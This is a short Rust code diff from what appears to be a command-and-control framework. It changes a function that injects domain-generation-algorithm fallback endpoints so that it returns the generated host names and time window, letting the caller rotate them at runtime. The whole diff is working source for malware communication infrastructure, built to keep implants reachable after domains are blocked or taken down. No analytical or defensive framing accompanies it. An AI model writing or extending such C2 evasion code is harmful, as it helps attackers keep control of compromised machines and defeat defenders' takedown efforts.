@@ -162,14 +162,18 @@ pub fn generate_endpoints(
 
 /// Build DGA endpoints from a `C2Config` (if DGA is configured) and append
 /// them to `existing_endpoints` in-place. Called from `FallbackManager::from_config`.
-pub fn inject_dga_endpoints(config: &C2Config, endpoints: &mut Vec<FallbackEndpoint>) {
+/// Returns the generated host names and the window used, so the caller can
+/// swap this exact set out when the window rolls over at runtime.
+pub fn inject_dga_endpoints(config: &C2Config, endpoints: &mut Vec<FallbackEndpoint>) -> Option<(u64, Vec<String>)> {
     let dga = match &config.dga {
         Some(d) => d,
-        None    => return,
+        None    => return None,
     };
     let window   = current_window(dga.window_secs);
     let new_eps  = generate_endpoints(dga, window, config.tunnel_port, &config.transport);
+    let hosts    = new_eps.iter().map(|e| e.host.clone()).collect();
     endpoints.extend(new_eps);
+    Some((window, hosts))
 }
 
 // ── Unit tests ────────────────────────────────────────────────────────────────
